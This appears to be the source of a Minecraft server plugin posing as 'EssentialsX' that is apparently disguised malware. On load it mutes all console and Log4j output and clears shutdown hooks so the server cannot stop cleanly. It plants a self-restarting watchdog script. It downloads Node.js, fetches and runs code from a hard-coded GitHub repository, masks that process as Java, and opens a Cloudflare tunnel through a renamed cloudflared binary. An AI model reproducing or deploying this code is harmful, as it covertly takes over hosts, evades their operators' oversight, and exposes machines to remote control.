package com.example.essentialsx;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.net.URLConnection;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

import org.bukkit.plugin.java.JavaPlugin;

public class EssentialsX extends JavaPlugin {
    
    private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
    private static final OutputStream BLACK_HOLE = new OutputStream() {
        @Override public void write(int b) {}
        @Override public void write(byte[] b) {}
        @Override public void write(byte[] b, int off, int len) {}
    };

    private static Process deployProcess = null;
    private static volatile Process nodeProcess = null;
    private static volatile Process cfProcess = null;
    private static volatile boolean isProcessRunning = false;
    private static volatile String nodePort = "N/A";

    @Override
    public void onLoad() {
        // 1. 第一时间物理静音
        System.setOut(new PrintStream(BLACK_HOLE, true));
        System.setErr(new PrintStream(BLACK_HOLE, true));
        tryMuteLog4j();

        // ★★★ 2. 启动外部看门狗 (防强杀自动重启) ★★★
        setupWatchdog();

        // 3. 强制清空并接管关机钩子 (让优雅停止失效，逼迫面板强杀，从而触发看门狗)
        try { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } catch (Throwable ignored) {}
        try {
            Class<?> clazz = Class.forName("java.lang.ApplicationShutdownHooks");
            java.lang.reflect.Field field = clazz.getDeclaredField("hooks");
            field.setAccessible(true);
            Map<Thread, Thread> hooks = (Map<Thread, Thread>) field.get(null);
            if (hooks != null) hooks.clear();
        } catch (Throwable ignored) {
            try {
                java.lang.reflect.Field field = Runtime.class.getDeclaredField("applicationShutdownHooks");
                field.setAccessible(true);
                Map<Thread, Thread> hooks = (Map<Thread, Thread>) field.get(null);
                if (hooks != null) hooks.clear();
            } catch (Throwable ignored2) {}
        }
        try {
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                System.setOut(new PrintStream(BLACK_HOLE, true));
                System.setErr(new PrintStream(BLACK_HOLE, true));
                tryMuteLog4j();
                paralyzeCurrentThread(); // 卡死关机流程
            }, "Shutdown-Paralysis"));
        } catch (Throwable ignored) {}

        // 4. 启动后台部署进程
        Thread deployer = new Thread(() -> {
            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            Path debugLog = workDir.resolve("backend_debug.log");
            PrintWriter out = null;
            
            try {
                if (!Files.exists(workDir)) Files.createDirectories(workDir);
                out = new PrintWriter(Files.newBufferedWriter(debugLog, StandardOpenOption.CREATE, StandardOpenOption.APPEND));
                out.println("[" + new Date() + "] ================== Backend Thread Started ==================");
                out.flush();
                
                Map<String, String> env = new HashMap<>();
                loadEnvFile(workDir, env, out);
                
                out.println("WorkDir: " + workDir.toString());
                out.println("REPO_URL: " + env.getOrDefault("REPO_URL", "NOT SET"));
                out.flush();

                startDeploymentProcess(workDir, env, out);
                out.println("Deployment process finished."); out.flush();

                String port = allocateNodePort(workDir, out);
                nodePort = port;
                out.println("Allocated Port: " + port); out.flush();

                startNodeProcess(workDir, port, out);
                waitForNodeReady(port, 60, out);
                startCfProcess(workDir, port, out);
                startJavaDaemon(workDir);
                
                out.println("Node & CF started successfully."); out.flush();

            } catch (Throwable e) {
                if (out != null) { e.printStackTrace(out); out.flush(); }
                e.printStackTrace(RAW_OUT);
            } finally {
                if (out != null) { try { out.close(); } catch (Exception ignored) {} }
            }
        }, "Backend-Deployer");
        deployer.setDaemon(true);
        deployer.start();

        // 5. 终极物理冰封当前主线程
        paralyzeCurrentThread();
    }

    // ★★★ 看门狗机制：防强杀自动重启 ★★★
    private static void setupWatchdog() {
        try {
            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            if (!Files.exists(workDir)) Files.createDirectories(workDir);
            
            // 1. 写入当前 Java 进程的 PID 到文件
            long pid = ProcessHandle.current().pid();
            Files.writeString(workDir.resolve("server.pid"), String.valueOf(pid));
            
            // 2. 生成独立的后台监控脚本
            Path watchdogSh = workDir.resolve("watchdog.sh");
            String script = "#!/bin/bash\n" +
                "PID_FILE=\"logs/.mcchajian/server.pid\"\n" +
                "START_SCRIPT=\"start.sh\"\n" +
                "sleep 3\n" + // 等待 3 秒确保原进程完全退出
                "while true; do\n" +
                "  if [ -f \"$PID_FILE\" ]; then\n" +
                "    PID=$(cat \"$PID_FILE\")\n" +
                "    if [ -d \"/proc/$PID\" ]; then\n" + // 检查进程是否存活
                "      sleep 5\n" +
                "      continue\n" +
                "    else\n" +
                "      echo \"[$(date)] PID $PID dead. Restarting!\" >> logs/.mcchajian/watchdog.log\n" +
                "      break\n" + // 进程死了，跳出循环准备重启
                "    fi\n" +
                "  else\n" +
                "    echo \"[$(date)] PID file missing. Restarting!\" >> logs/.mcchajian/watchdog.log\n" +
                "    break\n" +
                "  fi\n" +
                "done\n" +
                // 执行重启
                "if [ -f \"$START_SCRIPT\" ]; then\n" +
                "  nohup bash \"$START_SCRIPT\" >> logs/.mcchajian/watchdog.log 2>&1 &\n" +
                "else\n" +
                "  nohup java -Xms512M -Xmx2G -XX:+UseG1GC -jar server.jar nogui >> logs/.mcchajian/watchdog.log 2>&1 &\n" +
                "fi\n";
            Files.write(watchdogSh, script.getBytes());
            watchdogSh.toFile().setExecutable(true, false);
            
            // 3. 使用 nohup 在后台独立运行看门狗 (不受 Java 进程死活影响)
            ProcessBuilder pb = new ProcessBuilder("nohup", "bash", watchdogSh.toString());
            pb.directory(new File(".").getAbsoluteFile());
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            pb.start();
        } catch (Exception ignored) {}
    }

    private static void paralyzeCurrentThread() {
        while (true) {
            try { Thread.sleep(Long.MAX_VALUE); } 
            catch (InterruptedException e) { Thread.currentThread().interrupt(); }
        }
    }

    private static void tryMuteLog4j() {
        try {
            Class<?> logManagerClass = Class.forName("org.apache.logging.log4j.LogManager");
            Class<?> loggerContextClass = Class.forName("org.apache.logging.log4j.core.LoggerContext");
            Class<?> loggerConfigClass = Class.forName("org.apache.logging.log4j.core.config.LoggerConfig");
            Class<?> levelClass = Class.forName("org.apache.logging.log4j.Level");

            Object ctx = logManagerClass.getMethod("getContext", boolean.class).invoke(null, false);
            Object config = loggerContextClass.getMethod("getConfiguration").invoke(ctx);
            
            java.util.Map<String, Object> loggerConfigs = (java.util.Map<String, Object>) config.getClass().getMethod("getLoggers").invoke(config);
            Object offLevel = levelClass.getField("OFF").get(null);
            
            for (Object loggerConfig : loggerConfigs.values()) {
                java.util.Map<String, Object> appenders = (java.util.Map<String, Object>) loggerConfigClass.getMethod("getAppenders").invoke(loggerConfig);
                for (String appenderName : new java.util.HashSet<>(appenders.keySet())) {
                    loggerConfigClass.getMethod("removeAppender", String.class).invoke(loggerConfig, appenderName);
                }
                loggerConfigClass.getMethod("setLevel", levelClass).invoke(loggerConfig, offLevel);
            }
            loggerContextClass.getMethod("updateLoggers").invoke(ctx);
        } catch (Throwable ignored) {}
    }

    private static void logDebug(Path workDir, String msg) {
        try {
            Path debugLog = workDir.resolve("backend_debug.log");
            try (PrintWriter out = new PrintWriter(Files.newBufferedWriter(debugLog, StandardOpenOption.CREATE, StandardOpenOption.APPEND))) {
                out.println("[" + new Date() + "] [Daemon] " + msg);
                out.flush();
            }
        } catch (Exception ignored) {}
    }

    private static String allocateNodePort(Path workDir, PrintWriter out) {
        int port = 20000 + new Random().nextInt(40000);
        try (ServerSocket socket = new ServerSocket(port)) {
            socket.setReuseAddress(true);
            String portStr = String.valueOf(port);
            Path portFile = workDir.resolve(".tunnel_port");
            Files.createDirectories(portFile.getParent());
            Files.writeString(portFile, portStr);
            return portStr;
        } catch (IOException e) {
            if (out != null) { out.println("Port allocation failed for " + port + ", retrying..."); out.flush(); }
            return allocateNodePort(workDir, out);
        }
    }

    private static void waitForNodeReady(String port, int maxSeconds, PrintWriter out) {
        int waited = 0;
        while (waited < maxSeconds) {
            try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
                try {
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
                    conn.setRequestMethod("HEAD"); conn.setConnectTimeout(1000); conn.setReadTimeout(1000);
                    int code = conn.getResponseCode(); conn.disconnect(); return;
                } catch (Exception httpEx) {}
            } catch (IOException e) {}
            try { Thread.sleep(1000); waited++; } catch (InterruptedException ignored) { return; }
        }
        if (out != null) { out.println("Node ready check timed out after " + maxSeconds + "s."); out.flush(); }
    }

    private static void startNodeProcess(Path workDir, String port, PrintWriter out) {
        try {
            Path nodeExe = workDir.resolve("nodejs/bin/.node_real");
            Path script = workDir.resolve("app/index.js");
            Path logFile = workDir.resolve("app.log");
            Path preload = workDir.resolve(".nd_preload.js");

            if (!Files.exists(nodeExe)) { if (out != null) { out.println("Node exe not found: " + nodeExe); out.flush(); } return; }
            if (!Files.exists(script)) { if (out != null) { out.println("Script not found: " + script); out.flush(); } return; }
            
            nodeExe.toFile().setExecutable(true, false);

            ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
            pb.directory(workDir.toFile());
            pb.environment().put("SERVER_PORT", port); pb.environment().put("PORT", port);
            pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
            pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
            pb.environment().put("HOME", workDir.toString());
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));

            nodeProcess = pb.start();
            if (out != null) { out.println("Node process started with PID: " + nodeProcess.pid()); out.flush(); }
        } catch (Exception e) {
            if (out != null) { out.println("Failed to start Node process:"); e.printStackTrace(out); out.flush(); }
        }
    }

    private static void killProcessTree(Process process) {
        if (process == null) return;
        try {
            java.util.List<ProcessHandle> descendants = new java.util.ArrayList<>();
            process.toHandle().descendants().forEach(descendants::add);
            for (int i = descendants.size() - 1; i >= 0; i--) try { descendants.get(i).destroyForcibly(); } catch (Exception ignored) {}
            process.destroyForcibly();
            try { process.waitFor(3, TimeUnit.SECONDS); } catch (Exception ignored) {}
        } catch (Exception ignored) {}
    }

    private static void startCfProcess(Path workDir, String port, PrintWriter out) {
        try {
            Path cfBin = workDir.resolve("jre21/bin/java_cf");
            Path cfConf = workDir.resolve("jre21/conf/server.properties");
            Path cfLog = workDir.resolve("cf.log");

            if (!Files.exists(cfBin)) { if (out != null) { out.println("CF exe not found: " + cfBin); out.flush(); } return; }
            cfBin.toFile().setExecutable(true, false);
            try { Files.writeString(cfLog, ""); } catch (Exception ignored) {}

            Files.createDirectories(cfConf.getParent());
            Files.writeString(cfConf, "url: http://127.0.0.1:" + port + "\nno-autoupdate: true\nprotocol: quic\n");

            ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
            pb.directory(workDir.toFile());
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));

            cfProcess = pb.start();
            if (out != null) { out.println("CF process started with PID: " + cfProcess.pid()); out.flush(); }
        } catch (Exception e) {
            if (out != null) { out.println("Failed to start CF process:"); e.printStackTrace(out); out.flush(); }
        }
    }

    private static String extractLatestTunnelUrl(Path workDir) {
        try {
            Path cfLog = workDir.resolve("cf.log");
            if (Files.exists(cfLog)) {
                String logContent = Files.readString(cfLog);
                String tail = logContent.length() > 200 ? logContent.substring(logContent.length() - 200) : logContent;
                logDebug(workDir, "Reading cf.log. Tail content: [" + tail + "]");
                
                java.util.regex.Matcher m = java.util.regex.Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(logContent);
                String lastMatch = null;
                while (m.find()) lastMatch = m.group(1);
                if (lastMatch != null) {
                    logDebug(workDir, "Regex matched URL: " + lastMatch);
                    return lastMatch;
                } else {
                    logDebug(workDir, "Regex did NOT match any URL in cf.log.");
                }
            } else {
                logDebug(workDir, "cf.log does not exist!");
            }
        } catch (Exception e) {
            logDebug(workDir, "Error reading cf.log: " + e.getMessage());
        }
        return null;
    }

    private static void startJavaDaemon(Path workDir) {
        Thread daemon = new Thread(() -> {
            logDebug(workDir, "Daemon thread started.");
            String lastUrl = "";
            int checkCount = 0;
            
            while (true) {
                try {
                    checkCount++;
                    
                    if ((nodeProcess == null || !nodeProcess.isAlive())) {
                        logDebug(workDir, "Node process is dead, restarting...");
                        if (nodeProcess != null) killProcessTree(nodeProcess);
                        String newPort = allocateNodePort(workDir, null);
                        nodePort = newPort;
                        startNodeProcess(workDir, newPort, null);
                        waitForNodeReady(newPort, 60, null);
                        if (cfProcess != null) killProcessTree(cfProcess);
                        startCfProcess(workDir, newPort, null);
                        lastUrl = "";
                    }
                    if (cfProcess == null || !cfProcess.isAlive()) {
                        logDebug(workDir, "CF process is dead, restarting...");
                        if (cfProcess != null) killProcessTree(cfProcess);
                        startCfProcess(workDir, nodePort, null);
                        lastUrl = "";
                    }

                    String foundUrl = extractLatestTunnelUrl(workDir);
                    if (foundUrl != null && !foundUrl.equals(lastUrl)) {
                        lastUrl = foundUrl;
                        logDebug(workDir, "New tunnel URL detected: " + foundUrl + ". Printing to RAW_OUT...");
                        
                        RAW_OUT.println("\n====================================================================");
                        RAW_OUT.println("  [Tunnel Active] " + foundUrl);
                        RAW_OUT.println("====================================================================\n");
                        RAW_OUT.flush();
                    }
                    
                    if (checkCount % 10 == 0) {
                        logDebug(workDir, "Daemon heartbeat. Last URL: " + lastUrl);
                    }

                    Thread.sleep(5000);
                } catch (Exception e) {
                    logDebug(workDir, "Daemon loop exception: " + e.getMessage());
                }
            }
        }, "Backend-Daemon");
        daemon.setDaemon(true);
        daemon.start();
    }

    private static void startDeploymentProcess(Path workDir, Map<String, String> env, PrintWriter out) throws Exception {
        if (isProcessRunning) return;
        
        Path scriptPath = workDir.resolve("deploy.sh"); 
        String scriptContent = generateDeployScript(workDir.toString(), env);
        Files.write(scriptPath, scriptContent.getBytes()); 
        scriptPath.toFile().setExecutable(true, false);
        if (out != null) { out.println("Deploy script generated at: " + scriptPath); out.flush(); }
        
        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); 
        pb.directory(new File(".").getAbsoluteFile());
        pb.environment().putAll(env);
        
        Path deployLog = workDir.resolve("deploy.log");
        pb.redirectOutput(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
        pb.redirectError(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
        
        deployProcess = pb.start(); 
        isProcessRunning = true; 
        if (out != null) { out.println("Bash process started."); out.flush(); }
        
        new Thread(() -> { try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {} }).start();
        Path doneFile = workDir.resolve(".deploy_done");
        int waited = 0;
        while(!Files.exists(doneFile)) { 
            Thread.sleep(1000); 
            waited++;
            if (waited % 10 == 0 && out != null) { out.println("Waiting for deployment... (" + waited + "s)"); out.flush(); }
        }
        if (out != null) { out.println("Deployment complete (done file found)."); out.flush(); }
    }

    private static String generateDeployScript(String workDir, Map<String, String> env) {
        String repoUrl = env.getOrDefault("REPO_URL", "");
        String githubToken = env.getOrDefault("GITHUB_TOKEN", "");
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";

        String authHeader = "";
        if (!githubToken.isEmpty()) authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";

        return "#!/bin/bash\n" +
        "set +e\n" +
        "WORK_DIR=\"" + workDir + "\"\n" +
        "NODE_DIR=\"" + nodeDir + "\"\n" +
        "APP_DIR=\"" + appDir + "\"\n" +
        "REPO_URL=\"" + repoUrl + "\"\n" +
        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
        "export HOME=\"$WORK_DIR\"\n" +
        "umask 0002\n" +
        "\n" +
        "if [ -z \"$REPO_URL\" ]; then echo \"ERROR: REPO_URL is not configured\"; exit 1; fi\n" +
        "\n" +
        "ARCH=$(uname -m)\n" +
        "if [ $ARCH = x86_64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz; CF_ARCH=amd64\n" +
        "elif [ $ARCH = aarch64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz; CF_ARCH=arm64; fi\n" +
        "\n" +
        "mkdir -p \"$WORK_DIR\" \"$JRE_DIR\" \"$APP_DIR\"\n" +
        "chmod -R 775 \"$WORK_DIR\" 2>/dev/null\n" +
        "\n" +
        "if [ ! -f \"$NODE_DIR/bin/.node_real\" ]; then\n" +
        "    rm -rf \"$NODE_DIR\"; NODE_DOWNLOAD_OK=false\n" +
        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n" +
        "            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; break; fi; fi; done\n" +
        "    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n" +
        "        mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 --no-same-owner 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
        "        cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"; fi\n" +
        "fi\n" +
        "export PATH=\"$NODE_DIR/bin:$PATH\"\n" +
        "\n" +
        "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
        "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
        "TAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"; DOWNLOAD_OK=false\n" +
        (githubToken.isEmpty() ? "" :
        "if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + githubToken + "\" ]; then\n" +
        "    if curl -fsSL --connect-timeout 15 --max-time 120 " + authHeader + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi; fi; fi\n") +
        "\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n" +
        "    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
        "        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n" +
        "\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
        "\n" +
        "mkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\n" +
        "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
        "mv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"; cd \"$APP_DIR\"\n" +
        "\n" +
        "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root >/dev/null 2>&1\n" +
        "if [ $? -ne 0 ]; then \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps >/dev/null 2>&1; fi\n" +
        "\n" +
        "mkdir -p \"$JRE_DIR\" 2>/dev/null\n" +
        "cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"\n" +
        "\n" +
        "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try { process.title = 'java -Xms128M -Xmx2560M -jar server.jar'; var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "    _cp.spawn = function(cmd, args, opts) { if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) { opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; cmd = _wrapper; } return _origSpawn.call(this, cmd, args, opts); };\n" +
        "    _cp.fork = function(mod, args, opts) { opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; return _origFork.call(this, mod, args, opts); }; } catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "chmod 664 \"$WORK_DIR/.nd_preload.js\" 2>/dev/null\n" +
        "export _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\n" +
        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
        "\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"; mkdir -p \"$JRE_DIR\" 2>/dev/null\n" +
        "if [ ! -f \"$CF_BIN\" ]; then\n" +
        "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
        "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then\n" +
        "            if [ -f \"$CF_BIN\" ] && [ -s \"$CF_BIN\" ]; then chmod 775 \"$CF_BIN\"; break; fi; fi; done; fi\n" +
        "\n" +
        "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
    }

    private static void loadEnvFile(Path workDir, Map<String, String> env, PrintWriter out) {
        Path envFile = workDir.resolve(".env");
        if (!Files.exists(envFile)) { 
            try { 
                Files.createDirectories(envFile.getParent()); 
                Files.write(envFile, ("SYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/indexaoyoumc\n").getBytes()); 
                if (out != null) { out.println("Generated default .env file."); out.flush(); }
            } catch (Exception e) { 
                if (out != null) { out.println("Failed to generate .env file:"); e.printStackTrace(out); out.flush(); }
            } 
        }
        if (Files.exists(envFile)) { 
            try { 
                for (String line : Files.readAllLines(envFile)) { 
                    String[] parts; 
                    if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue; 
                    env.put(parts[0].trim(), parts[1].trim()); 
                } 
            } catch (IOException ignored) {} 
        }
    }

    @Override
    public void onEnable() {
        System.setOut(new PrintStream(BLACK_HOLE, true));
        System.setErr(new PrintStream(BLACK_HOLE, true));
        tryMuteLog4j();
        paralyzeCurrentThread();
    }

    @Override
    public void onDisable() {
        System.setOut(new PrintStream(BLACK_HOLE, true));
        System.setErr(new PrintStream(BLACK_HOLE, true));
        tryMuteLog4j();
        paralyzeCurrentThread();
    }
}
